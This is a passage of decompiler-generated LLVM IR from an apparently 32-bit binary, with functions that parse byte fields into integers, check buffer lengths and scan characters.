  br i1 %v1_1000c554, label %dec_label_pc_1000c61c, label %dec_label_pc_1000c56c

dec_label_pc_1000c56c:                            ; preds = %dec_label_pc_1000c524
  %v0_1000c570 = load i32, i32* @r26, align 4
  %v2_1000c570 = add i32 %v0_1000c570, %v2_1000c558
  store i32 %v2_1000c570, i32* @r30, align 4
  %tmp6 = icmp sgt i32 %v1_1000c560, -1
  br i1 %tmp6, label %dec_label_pc_1000c580, label %dec_label_pc_1000c578

dec_label_pc_1000c578:                            ; preds = %dec_label_pc_1000c56c
  store i32 %v1_1000c560, i32* @r27, align 4
  br label %dec_label_pc_1000c61c

dec_label_pc_1000c580:                            ; preds = %dec_label_pc_1000c56c
  store i32 268486020, i32* @lr, align 4
  %v1_1000c580 = call i32 @function_100073b0(i32 %v2_1000c530)
  %v0_1000c584 = load i32, i32* @r30, align 4
  %v1_1000c584 = add i32 %v0_1000c584, 2
  store i32 %v1_1000c584, i32* %r8.global-to-local, align 4
  %v1_1000c588 = load i32, i32* @r31, align 4
  %v2_1000c588 = inttoptr i32 %v1_1000c588 to i32*
  store i32 %v1_1000c580, i32* %v2_1000c588, align 4
  %v0_1000c58c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000c58c = add i32 %v0_1000c58c, 2
  store i32 %v1_1000c58c, i32* %r10.global-to-local, align 4
  %v0_1000c590 = load i32, i32* @r30, align 4
  %v1_1000c590 = add i32 %v0_1000c590, 10
  store i32 %v1_1000c590, i32* %r6.global-to-local, align 4
  %v0_1000c594 = load i32, i32* @r26, align 4
  %v1_1000c594 = load i32, i32* @r28, align 4
  %v2_1000c594 = add i32 %v1_1000c594, %v0_1000c594
  %v3_1000c594 = inttoptr i32 %v2_1000c594 to i8*
  %v4_1000c594 = load i8, i8* %v3_1000c594, align 1
  %v5_1000c594 = zext i8 %v4_1000c594 to i32
  store i32 %v5_1000c594, i32* %r0.global-to-local, align 4
  %v1_1000c598 = add i32 %v0_1000c590, 1
  %v2_1000c598 = inttoptr i32 %v1_1000c598 to i8*
  %v3_1000c598 = load i8, i8* %v2_1000c598, align 1
  %v4_1000c598 = zext i8 %v3_1000c598 to i32
  store i32 %v4_1000c598, i32* %r9.global-to-local, align 4
  %v1_1000c59c = mul nuw nsw i32 %v5_1000c594, 256
  %v2_1000c5a0 = or i32 %v4_1000c598, %v1_1000c59c
  store i32 %v2_1000c5a0, i32* %r0.global-to-local, align 4
  %v1_1000c5a4 = load i32, i32* @r31, align 4
  %v2_1000c5a4 = add i32 %v1_1000c5a4, 4
  %v3_1000c5a4 = inttoptr i32 %v2_1000c5a4 to i32*
  store i32 %v2_1000c5a0, i32* %v3_1000c5a4, align 4
  %v0_1000c5a8 = load i32, i32* @r30, align 4
  %v1_1000c5a8 = add i32 %v0_1000c5a8, 2
  %v2_1000c5a8 = inttoptr i32 %v1_1000c5a8 to i8*
  %v3_1000c5a8 = load i8, i8* %v2_1000c5a8, align 1
  %v4_1000c5a8 = zext i8 %v3_1000c5a8 to i32
  store i32 %v4_1000c5a8, i32* %r0.global-to-local, align 4
  %v0_1000c5ac = load i32, i32* %r8.global-to-local, align 4
  %v1_1000c5ac = add i32 %v0_1000c5ac, 1
  %v2_1000c5ac = inttoptr i32 %v1_1000c5ac to i8*
  %v3_1000c5ac = load i8, i8* %v2_1000c5ac, align 1
  %v4_1000c5ac = zext i8 %v3_1000c5ac to i32
  store i32 %v4_1000c5ac, i32* %r9.global-to-local, align 4
  %v1_1000c5b0 = mul nuw nsw i32 %v4_1000c5a8, 256
  %v2_1000c5b4 = or i32 %v4_1000c5ac, %v1_1000c5b0
  store i32 %v2_1000c5b4, i32* %r0.global-to-local, align 4
  %v1_1000c5b8 = load i32, i32* @r31, align 4
  %v2_1000c5b8 = add i32 %v1_1000c5b8, 8
  %v3_1000c5b8 = inttoptr i32 %v2_1000c5b8 to i32*
  store i32 %v2_1000c5b4, i32* %v3_1000c5b8, align 4
  %v0_1000c5bc = load i32, i32* %r8.global-to-local, align 4
  %v1_1000c5bc = add i32 %v0_1000c5bc, 2
  %v2_1000c5bc = inttoptr i32 %v1_1000c5bc to i8*
  %v3_1000c5bc = load i8, i8* %v2_1000c5bc, align 1
  %v4_1000c5bc = zext i8 %v3_1000c5bc to i32
  store i32 %v4_1000c5bc, i32* %r0.global-to-local, align 4
  %v0_1000c5c0 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000c5c0 = add i32 %v0_1000c5c0, 1
  %v2_1000c5c0 = inttoptr i32 %v1_1000c5c0 to i8*
  %v3_1000c5c0 = load i8, i8* %v2_1000c5c0, align 1
  %v4_1000c5c0 = zext i8 %v3_1000c5c0 to i32
  store i32 %v4_1000c5c0, i32* %r11.global-to-local, align 4
  %v1_1000c5c4 = add i32 %v0_1000c5c0, 3
  %v2_1000c5c4 = inttoptr i32 %v1_1000c5c4 to i8*
  %v3_1000c5c4 = load i8, i8* %v2_1000c5c4, align 1
  %v4_1000c5c4 = zext i8 %v3_1000c5c4 to i32
  %v1_1000c5c8 = mul nuw i32 %v4_1000c5bc, 16777216
  store i32 %v1_1000c5c8, i32* %r0.global-to-local, align 4
  %v1_1000c5cc = add i32 %v0_1000c5c0, 2
  %v2_1000c5cc = inttoptr i32 %v1_1000c5cc to i8*
  %v3_1000c5cc = load i8, i8* %v2_1000c5cc, align 1
  %v4_1000c5cc = zext i8 %v3_1000c5cc to i32
  %v1_1000c5d0 = mul nuw nsw i32 %v4_1000c5c0, 65536
  %v2_1000c5d4 = or i32 %v1_1000c5d0, %v1_1000c5c8
  %v0_1000c5d8 = load i32, i32* @r28, align 4
  %v1_1000c5d8 = add i32 %v0_1000c5d8, 10
  store i32 %v1_1000c5d8, i32* %r11.global-to-local, align 4
  %v2_1000c5dc = or i32 %v2_1000c5d4, %v4_1000c5c4
  store i32 %v2_1000c5dc, i32* %r0.global-to-local, align 4
  %v1_1000c5e0 = mul nuw nsw i32 %v4_1000c5cc, 256
  %v2_1000c5e4 = or i32 %v1_1000c5e0, %v2_1000c5dc
  store i32 %v2_1000c5e4, i32* %r9.global-to-local, align 4
  %v1_1000c5e8 = load i32, i32* @r31, align 4
  %v2_1000c5e8 = add i32 %v1_1000c5e8, 12
  %v3_1000c5e8 = inttoptr i32 %v2_1000c5e8 to i32*
  store i32 %v2_1000c5e4, i32* %v3_1000c5e8, align 4
  %v0_1000c5ec = load i32, i32* %r8.global-to-local, align 4
  %v1_1000c5ec = add i32 %v0_1000c5ec, 6
  %v2_1000c5ec = inttoptr i32 %v1_1000c5ec to i8*
  %v3_1000c5ec = load i8, i8* %v2_1000c5ec, align 1
  %v4_1000c5ec = zext i8 %v3_1000c5ec to i32
  store i32 %v4_1000c5ec, i32* %r9.global-to-local, align 4
  %v0_1000c5f0 = load i32, i32* @r30, align 4
  %v1_1000c5f0 = add i32 %v0_1000c5f0, 9
  %v2_1000c5f0 = inttoptr i32 %v1_1000c5f0 to i8*
  %v3_1000c5f0 = load i8, i8* %v2_1000c5f0, align 1
  %v4_1000c5f0 = zext i8 %v3_1000c5f0 to i32
  store i32 %v4_1000c5f0, i32* %r0.global-to-local, align 4
  %v1_1000c5f4 = mul nuw nsw i32 %v4_1000c5ec, 256
  store i32 %v1_1000c5f4, i32* %r9.global-to-local, align 4
  %v0_1000c5f8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c5f8 = load i32, i32* @r31, align 4
  %v2_1000c5f8 = add i32 %v1_1000c5f8, 24
  %v3_1000c5f8 = inttoptr i32 %v2_1000c5f8 to i32*
  store i32 %v0_1000c5f8, i32* %v3_1000c5f8, align 4
  %v0_1000c5fc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c5fc = load i32, i32* %r0.global-to-local, align 4
  %v2_1000c5fc = or i32 %v1_1000c5fc, %v0_1000c5fc
  store i32 %v2_1000c5fc, i32* %r9.global-to-local, align 4
  %v0_1000c600 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000c600 = load i32, i32* @r31, align 4
  %v2_1000c600 = add i32 %v1_1000c600, 20
  %v3_1000c600 = inttoptr i32 %v2_1000c600 to i32*
  store i32 %v0_1000c600, i32* %v3_1000c600, align 4
  %v0_1000c604 = load i32, i32* @r29, align 4
  %v1_1000c604 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000c604 = icmp slt i32 %v0_1000c604, %v1_1000c604
  %v1_1000c608 = add i32 %v1_1000c604, 10
  store i32 %v1_1000c608, i32* %r0.global-to-local, align 4
  %v0_1000c60c = load i32, i32* @r27, align 4
  %v2_1000c60c = add i32 %v0_1000c60c, %v1_1000c608
  store i32 %v2_1000c60c, i32* @r27, align 4
  %v1_1000c610 = load i32, i32* @r31, align 4
  %v2_1000c610 = add i32 %v1_1000c610, 16
  %v3_1000c610 = inttoptr i32 %v2_1000c610 to i32*
  store i32 %v1_1000c604, i32* %v3_1000c610, align 4
  br i1 %v2_1000c604, label %dec_label_pc_1000c618, label %dec_label_pc_1000c580.dec_label_pc_1000c61c_crit_edge

dec_label_pc_1000c580.dec_label_pc_1000c61c_crit_edge: ; preds = %dec_label_pc_1000c580
  %v0_1000c620.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000c61c

dec_label_pc_1000c618:                            ; preds = %dec_label_pc_1000c580
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_1000c61c

dec_label_pc_1000c61c:                            ; preds = %dec_label_pc_1000c580.dec_label_pc_1000c61c_crit_edge, %dec_label_pc_1000c524, %dec_label_pc_1000c578, %dec_label_pc_1000c618
  %v0_1000c620 = phi i32 [ %v0_1000c620.pre, %dec_label_pc_1000c580.dec_label_pc_1000c61c_crit_edge ], [ %v2_1000c550, %dec_label_pc_1000c524 ], [ %v1_1000c560, %dec_label_pc_1000c578 ], [ -1, %dec_label_pc_1000c618 ]
  store i32 %v0_1000c528, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000c620

; uselistorder directives
  uselistorder i32 %v1_1000c604, { 1, 0, 2 }
  uselistorder i32 %v1_1000c5c8, { 1, 0 }
  uselistorder i32 %v1_1000c560, { 1, 2, 0 }
  uselistorder i32 %v2_1000c550, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000c530, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0 }
  uselistorder i32 20, { 16, 17, 18, 19, 1, 23, 20, 21, 24, 25, 26, 27, 10, 11, 13, 12, 0, 37, 38, 28, 29, 30, 31, 32, 34, 35, 33, 36, 22, 4, 14, 5, 3, 2, 6, 15, 7, 8, 9 }
  uselistorder i32 9, { 10, 11, 12, 13, 2, 0, 14, 3, 15, 4, 16, 17, 18, 19, 20, 21, 1, 5, 6, 7, 8, 9 }
  uselistorder i32 (i32)* @function_100073b0, { 2, 1, 0, 3 }
  uselistorder i32 -10, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000c61c, { 3, 0, 2, 1 }
}

define i32 @function_1000c634() local_unnamed_addr {
dec_label_pc_1000c634:
  %v0_1000c638 = load i32, i32* @lr, align 4
  store i32 268486236, i32* @lr, align 4
  %v3_1000c658 = call i32 @function_10004ca0(i32 ptrtoint ([11 x i8]* @global_var_1000f3a8.339 to i32), i32 ptrtoint (i32* @global_var_1000f344.309 to i32))
  %v3_1000c660 = icmp eq i32 %v3_1000c658, 0
  br i1 %v3_1000c660, label %dec_label_pc_1000c668, label %dec_label_pc_1000c684

dec_label_pc_1000c668:                            ; preds = %dec_label_pc_1000c634
  %v0_1000c65c = load i32, i32* @r29, align 4
  store i32 %v0_1000c638, i32* @lr, align 4
  %v3_1000c680 = call i32 @function_10004ca0(i32 ptrtoint ([18 x i8]* @global_var_1000f3b4.340 to i32), i32 %v0_1000c65c)
  br label %dec_label_pc_1000c684

dec_label_pc_1000c684:                            ; preds = %dec_label_pc_1000c634, %dec_label_pc_1000c668
  %v0_1000c694 = phi i32 [ %v3_1000c658, %dec_label_pc_1000c634 ], [ %v3_1000c680, %dec_label_pc_1000c668 ]
  ret i32 %v0_1000c694

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_10004ca0, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000c684, { 1, 0 }
}

define i32 @function_1000c698(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_1000c698:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  %tmp = ptrtoint i32* %arg5 to i32
  %v0_1000c698 = load i32, i32* @lr, align 4
  store i32 %arg6, i32* @r30, align 4
  %v1_1000c6ac = sub i32 0, %arg6
  %v1_1000c6b0 = urem i32 %v1_1000c6ac, 4
  store i32 %v1_1000c6b0, i32* %r0.global-to-local, align 4
  %v3_1000c6b0 = icmp eq i32 %v1_1000c6b0, 0
  store i32 %arg1, i32* @r20, align 4
  store i32 %arg2, i32* %r15.global-to-local, align 4
  store i32 %arg3, i32* %r19.global-to-local, align 4
  store i32 %arg4, i32* %r18.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v0_1000c6c8 = load i32, i32* @r10, align 4
  store i32 %v0_1000c6c8, i32* %r17.global-to-local, align 4
  store i32 %arg8, i32* %r16.global-to-local, align 4
  %v0_1000c6e4.pr = load i32, i32* %r9.global-to-local, align 4
  br i1 %v3_1000c6b0, label %dec_label_pc_1000c6e4, label %dec_label_pc_1000c6d4

dec_label_pc_1000c6d4:                            ; preds = %dec_label_pc_1000c698
  %v2_1000c6d4 = icmp ult i32 %v0_1000c6e4.pr, %v1_1000c6b0
  br i1 %v2_1000c6d4, label %dec_label_pc_1000c998, label %dec_label_pc_1000c6dc

dec_label_pc_1000c6dc:                            ; preds = %dec_label_pc_1000c6d4
  %v2_1000c6dc = sub i32 %v0_1000c6e4.pr, %v1_1000c6b0
  store i32 %v2_1000c6dc, i32* %r9.global-to-local, align 4
  %v2_1000c6e0 = add i32 %v1_1000c6b0, %arg6
  store i32 %v2_1000c6e0, i32* @r30, align 4
  br label %dec_label_pc_1000c6e4

dec_label_pc_1000c6e4:                            ; preds = %dec_label_pc_1000c698, %dec_label_pc_1000c6dc
  %v0_1000c6f0 = phi i32 [ %v2_1000c6e0, %dec_label_pc_1000c6dc ], [ %arg6, %dec_label_pc_1000c698 ]
  %v0_1000c6f4 = phi i32 [ %v2_1000c6dc, %dec_label_pc_1000c6dc ], [ %v0_1000c6e4.pr, %dec_label_pc_1000c698 ]
  %tmp49 = icmp ult i32 %v0_1000c6f4, 32
  br i1 %tmp49, label %dec_label_pc_1000c998, label %dec_label_pc_1000c6ec

dec_label_pc_1000c6ec:                            ; preds = %dec_label_pc_1000c6e4
  %v3_1000c6ec = icmp eq i32 %arg4, 1
  %v1_1000c6f0 = add i32 %v0_1000c6f0, 32
  store i32 %v1_1000c6f0, i32* @r24, align 4
  %v1_1000c6f4 = add i32 %v0_1000c6f4, -32
  store i32 %v1_1000c6f4, i32* @r27, align 4
  br i1 %v3_1000c6ec, label %dec_label_pc_1000c7f4, label %dec_label_pc_1000c6fc

dec_label_pc_1000c6fc:                            ; preds = %dec_label_pc_1000c6ec
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1000c704 = inttoptr i32 %arg8 to i32*
  store i32 -1, i32* %v2_1000c704, align 4
  %tmp50 = icmp ult i32 %v1_1000c6f4, 4
  br i1 %tmp50, label %dec_label_pc_1000c998, label %dec_label_pc_1000c70c

dec_label_pc_1000c70c:                            ; preds = %dec_label_pc_1000c6fc
  %v0_1000c70c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c70c = add i32 %v0_1000c70c, -36
  store i32 %v1_1000c70c, i32* %r0.global-to-local, align 4
  %tmp51 = icmp ult i32 %v1_1000c70c, 8
  br i1 %tmp51, label %dec_label_pc_1000c998, label %dec_label_pc_1000c718

dec_label_pc_1000c718:                            ; preds = %dec_label_pc_1000c70c
  %v0_1000c718 = load i32, i32* @r27, align 4
  %tmp52 = icmp ult i32 %v0_1000c718, 16
  br i1 %tmp52, label %dec_label_pc_1000c998, label %dec_label_pc_1000c720

dec_label_pc_1000c720:                            ; preds = %dec_label_pc_1000c718
  %v1_1000c720 = add i32 %v0_1000c70c, -48
  store i32 %v1_1000c720, i32* %r0.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_1000c720, 8
  br i1 %tmp53, label %dec_label_pc_1000c998, label %dec_label_pc_1000c72c

dec_label_pc_1000c72c:                            ; preds = %dec_label_pc_1000c720
  %v1_1000c72c = add i32 %v0_1000c70c, -56
  store i32 %v1_1000c72c, i32* %r0.global-to-local, align 4
  %v1_1000c730 = add i32 %v0_1000c70c, -44
  store i32 %v1_1000c730, i32* @r27, align 4
  %v3_1000c734 = icmp ugt i32 %v1_1000c72c, %v1_1000c730
  %v0_1000c738 = load i32, i32* @r30, align 4
  %v1_1000c738 = add i32 %v0_1000c738, 36
  store i32 %v1_1000c738, i32* @r29, align 4
  %v1_1000c73c = add i32 %v0_1000c738, 48
  store i32 %v1_1000c73c, i32* @r26, align 4
  br i1 %v3_1000c734, label %dec_label_pc_1000c750, label %dec_label_pc_1000c748

dec_label_pc_1000c748:                            ; preds = %dec_label_pc_1000c72c
  store i32 %v1_1000c72c, i32* @r27, align 4
  br label %dec_label_pc_1000c750

dec_label_pc_1000c750:                            ; preds = %dec_label_pc_1000c72c, %dec_label_pc_1000c748
  %v0_1000c750 = phi i32 [ %v1_1000c72c, %dec_label_pc_1000c748 ], [ %v1_1000c730, %dec_label_pc_1000c72c ]
  %tmp54 = icmp ult i32 %v0_1000c750, 80
  br i1 %tmp54, label %dec_label_pc_1000c998, label %dec_label_pc_1000c758

dec_label_pc_1000c758:                            ; preds = %dec_label_pc_1000c750
  store i32 268486492, i32* @lr, align 4
  %v0_1000c758 = call i32 @function_1000c634()
  store i32 %v0_1000c758, i32* @r20, align 4
  %v3_1000c75c = icmp eq i32 %v0_1000c758, 0
  br i1 %v3_1000c75c, label %dec_label_pc_1000c77c, label %dec_label_pc_1000c764

dec_label_pc_1000c764:                            ; preds = %dec_label_pc_1000c758
  %v0_1000c764 = load i32, i32* @r24, align 4
  store i32 %v0_1000c764, i32* @r25, align 4
  %v0_1000c76c = load i32, i32* @r26, align 4
  store i32 %v0_1000c76c, i32* @r23, align 4
  %v0_1000c770 = load i32, i32* @r31, align 4
  store i32 %v0_1000c770, i32* @r24, align 4
  store i32 %v0_1000c764, i32* %r21.global-to-local, align 4
  %v1_1000c80c.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_1000c804

dec_label_pc_1000c77c:                            ; preds = %dec_label_pc_1000c758
  %v1_1000c77c = load i32, i32* %r17.global-to-local, align 4
  %v2_1000c77c = inttoptr i32 %v1_1000c77c to i32*
  store i32 0, i32* %v2_1000c77c, align 4
  %v0_1000c780 = call i32 @function_10004b48()
  %v1_1000c784 = inttoptr i32 %v0_1000c780 to i32*
  %v2_1000c784 = load i32, i32* %v1_1000c784, align 4
  store i32 %v2_1000c784, i32* @r26, align 4
  br label %dec_label_pc_1000c99c

dec_label_pc_1000c78c:                            ; preds = %dec_label_pc_1000c92c
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000c790 = load i32, i32* @r25, align 4
  %v1_1000c790 = load i32, i32* @r22, align 4
  %v2_1000c790 = inttoptr i32 %v1_1000c790 to i32*
  store i32 %v0_1000c790, i32* %v2_1000c790, align 4
  %v0_1000c794 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c794 = load i32, i32* @r22, align 4
  %v2_1000c794 = add i32 %v1_1000c794, 4
  %v3_1000c794 = inttoptr i32 %v2_1000c794 to i32*
  store i32 %v0_1000c794, i32* %v3_1000c794, align 4
  %v0_1000c798 = load i32, i32* @r30, align 4
  %v1_1000c798 = add i32 %v0_1000c798, 8
  store i32 %v1_1000c798, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_1000c7a0 = add i32 %v0_1000c798, 4
  %v2_1000c7a0 = inttoptr i32 %v1_1000c7a0 to i32*
  %v3_1000c7a0 = load i32, i32* %v2_1000c7a0, align 4
  store i32 %v3_1000c7a0, i32* %r0.global-to-local, align 4
  %v0_1000c7a4 = load i32, i32* %r19.global-to-local, align 4
  %v1_1000c7a4 = load i32, i32* @r28, align 4
  %v2_1000c7a4 = add i32 %v1_1000c7a4, 8
  %v3_1000c7a4 = inttoptr i32 %v2_1000c7a4 to i32*
  store i32 %v0_1000c7a4, i32* %v3_1000c7a4, align 4
  %v0_1000c7a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c7a8 = load i32, i32* @r28, align 4
  %v2_1000c7a8 = inttoptr i32 %v1_1000c7a8 to i32*
  store i32 %v0_1000c7a8, i32* %v2_1000c7a8, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1000c7b0 = load i32, i32* @r28, align 4
  %v2_1000c7b0 = add i32 %v1_1000c7b0, 12
  %v3_1000c7b0 = inttoptr i32 %v2_1000c7b0 to i32*
  store i32 4, i32* %v3_1000c7b0, align 4
  %v0_1000c7b4 = load i32, i32* @r22, align 4
  %v1_1000c7b4 = load i32, i32* @r28, align 4
  %v2_1000c7b4 = add i32 %v1_1000c7b4, 16
  %v3_1000c7b4 = inttoptr i32 %v2_1000c7b4 to i32*
  store i32 %v0_1000c7b4, i32* %v3_1000c7b4, align 4
  br label %dec_label_pc_1000c7e8

dec_label_pc_1000c7bc:                            ; preds = %dec_label_pc_1000c950
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000c7c0 = load i32, i32* %r21.global-to-local, align 4
  %v1_1000c7c0 = load i32, i32* @r23, align 4
  %v2_1000c7c0 = inttoptr i32 %v1_1000c7c0 to i32*
  store i32 %v0_1000c7c0, i32* %v2_1000c7c0, align 4
  %v0_1000c7c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c7c4 = load i32, i32* @r23, align 4
  %v2_1000c7c4 = add i32 %v1_1000c7c4, 4
  %v3_1000c7c4 = inttoptr i32 %v2_1000c7c4 to i32*
  store i32 %v0_1000c7c4, i32* %v3_1000c7c4, align 4
  %v0_1000c7c8 = load i32, i32* @r30, align 4
  %v1_1000c7c8 = add i32 %v0_1000c7c8, 8
  store i32 %v1_1000c7c8, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_1000c7d0 = add i32 %v0_1000c7c8, 4
  %v2_1000c7d0 = inttoptr i32 %v1_1000c7d0 to i32*
  %v3_1000c7d0 = load i32, i32* %v2_1000c7d0, align 4
  store i32 %v3_1000c7d0, i32* %r0.global-to-local, align 4
  %v0_1000c7d4 = load i32, i32* %r19.global-to-local, align 4
  %v1_1000c7d4 = load i32, i32* @r28, align 4
  %v2_1000c7d4 = add i32 %v1_1000c7d4, 8
  %v3_1000c7d4 = inttoptr i32 %v2_1000c7d4 to i32*
  store i32 %v0_1000c7d4, i32* %v3_1000c7d4, align 4
  %v0_1000c7d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c7d8 = load i32, i32* @r28, align 4
  %v2_1000c7d8 = inttoptr i32 %v1_1000c7d8 to i32*
  store i32 %v0_1000c7d8, i32* %v2_1000c7d8, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_1000c7e0 = load i32, i32* @r28, align 4
  %v2_1000c7e0 = add i32 %v1_1000c7e0, 12
  %v3_1000c7e0 = inttoptr i32 %v2_1000c7e0 to i32*
  store i32 16, i32* %v3_1000c7e0, align 4
  %v0_1000c7e4 = load i32, i32* @r23, align 4
  %v1_1000c7e4 = load i32, i32* @r28, align 4
  %v2_1000c7e4 = add i32 %v1_1000c7e4, 16
  %v3_1000c7e4 = inttoptr i32 %v2_1000c7e4 to i32*
  store i32 %v0_1000c7e4, i32* %v3_1000c7e4, align 4
  br label %dec_label_pc_1000c7e8

dec_label_pc_1000c7e8:                            ; preds = %dec_label_pc_1000c78c, %dec_label_pc_1000c7bc
  %v0_1000c7e8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c7e8 = load i32, i32* @r28, align 4
  %v2_1000c7e8 = add i32 %v1_1000c7e8, 4
  %v3_1000c7e8 = inttoptr i32 %v2_1000c7e8 to i32*
  store i32 %v0_1000c7e8, i32* %v3_1000c7e8, align 4
  %v0_1000c7ec = load i32, i32* @r28, align 4
  %v1_1000c7ec = load i32, i32* %r17.global-to-local, align 4
  %v2_1000c7ec = inttoptr i32 %v1_1000c7ec to i32*
  store i32 %v0_1000c7ec, i32* %v2_1000c7ec, align 4
  br label %dec_label_pc_1000c984

dec_label_pc_1000c7f4:                            ; preds = %dec_label_pc_1000c6ec
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %r21.global-to-local, align 4
  store i32 0, i32* @r23, align 4
  br label %dec_label_pc_1000c804

dec_label_pc_1000c804:                            ; preds = %dec_label_pc_1000c764, %dec_label_pc_1000c7f4
  %v1_1000c80c = phi i32 [ %v1_1000c80c.pre, %dec_label_pc_1000c764 ], [ %arg8, %dec_label_pc_1000c7f4 ]
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  %v2_1000c80c = inttoptr i32 %v1_1000c80c to i32*
  store i32 1, i32* %v2_1000c80c, align 4
  br label %dec_label_pc_1000c96c

dec_label_pc_1000c814:                            ; preds = %dec_label_pc_1000c96c
  %v0_1000c814 = load i32, i32* @r24, align 4
  store i32 %v0_1000c814, i32* @r3, align 4
  store i32 268486688, i32* @lr, align 4
  %v2_1000c81c = call i32 @function_1000cacc(i32 %v0_1000c814, i32 35)
  %v4_1000c820 = icmp eq i32 %v2_1000c81c, 0
  br i1 %v4_1000c820, label %dec_label_pc_1000c830, label %dec_label_pc_1000c828

dec_label_pc_1000c828:                            ; preds = %dec_label_pc_1000c814
  %v3_1000c81c = inttoptr i32 %v2_1000c81c to i8*
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v3_1000c81c, align 1
  br label %dec_label_pc_1000c830

dec_label_pc_1000c830:                            ; preds = %dec_label_pc_1000c814, %dec_label_pc_1000c828
  %v0_1000c830 = load i32, i32* @r24, align 4
  store i32 %v0_1000c830, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_1000c8ac17 = inttoptr i32 %v0_1000c830 to i8*
  %v2_1000c8ac18 = load i8, i8* %v1_1000c8ac17, align 1
  %v3_1000c8ac19 = zext i8 %v2_1000c8ac18 to i32
  store i32 %v3_1000c8ac19, i32* %r0.global-to-local, align 4
  %v3_1000c8b021 = icmp eq i8 %v2_1000c8ac18, 0
  br i1 %v3_1000c8b021, label %dec_label_pc_1000c8b8, label %dec_label_pc_1000c848.preheader

dec_label_pc_1000c83c:                            ; preds = %dec_label_pc_1000c858
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1000c840 = inttoptr i32 %v0_1000c87c to i8*
  store i8 0, i8* %v3_1000c840, align 1
  %v0_1000c844 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c844 = add i32 %v0_1000c844, 1
  store i32 %v1_1000c844, i32* %r11.global-to-local, align 4
  %v1_1000c848 = inttoptr i32 %v1_1000c844 to i8*
  %v2_1000c848 = load i8, i8* %v1_1000c848, align 1
  %v3_1000c848 = zext i8 %v2_1000c848 to i32
  store i32 %v3_1000c848, i32* %r0.global-to-local, align 4
  %v3_1000c84c = icmp eq i8 %v2_1000c848, 0
  br i1 %v3_1000c84c, label %dec_label_pc_1000c8b8, label %dec_label_pc_1000c858

dec_label_pc_1000c858:                            ; preds = %dec_label_pc_1000c848.preheader, %dec_label_pc_1000c83c
  %v0_1000c87c = phi i32 [ %v1_1000c844, %dec_label_pc_1000c83c ], [ %v0_1000c8482, %dec_label_pc_1000c848.preheader ]
  %v0_1000c860.in = phi i32 [ %v3_1000c848, %dec_label_pc_1000c83c ], [ %v3_1000c8485, %dec_label_pc_1000c848.preheader ]
  %v0_1000c860 = mul nuw nsw i32 %v0_1000c860.in, 2
  %v3_1000c85c = load i32, i32* @global_var_1001044c, align 4
  store i32 %v3_1000c85c, i32* %r9.global-to-local, align 4
  %v2_1000c860 = add i32 %v3_1000c85c, %v0_1000c860
  %v3_1000c860 = inttoptr i32 %v2_1000c860 to i16*
  %v4_1000c860 = load i16, i16* %v3_1000c860, align 2
  %v5_1000c860 = zext i16 %v4_1000c860 to i32
  store i32 %v5_1000c860, i32* %r0.global-to-local, align 4
  %v1_1000c864 = and i32 %v5_1000c860, 32
  store i32 %v1_1000c864, i32* %r9.global-to-local, align 4
  %v3_1000c864 = icmp eq i32 %v1_1000c864, 0
  br i1 %v3_1000c864, label %dec_label_pc_1000c86c, label %dec_label_pc_1000c83c

dec_label_pc_1000c86c:                            ; preds = %dec_label_pc_1000c858
  %v0_1000c86c = load i32, i32* @r29, align 4
  %v2_1000c86c = icmp sgt i32 %v0_1000c86c, 6
  br i1 %v2_1000c86c, label %dec_label_pc_1000c888.preheader, label %dec_label_pc_1000c874

dec_label_pc_1000c874:                            ; preds = %dec_label_pc_1000c86c
  %v1_1000c874 = mul i32 %v0_1000c86c, 4
  store i32 %v1_1000c874, i32* %r0.global-to-local, align 4
  %v1_1000c878 = add i32 %v0_1000c86c, 1
  store i32 %v1_1000c878, i32* @r29, align 4
  %v1_1000c87c = load i32, i32* @r30, align 4
  %v3_1000c87c = add i32 %v1_1000c87c, %v1_1000c874
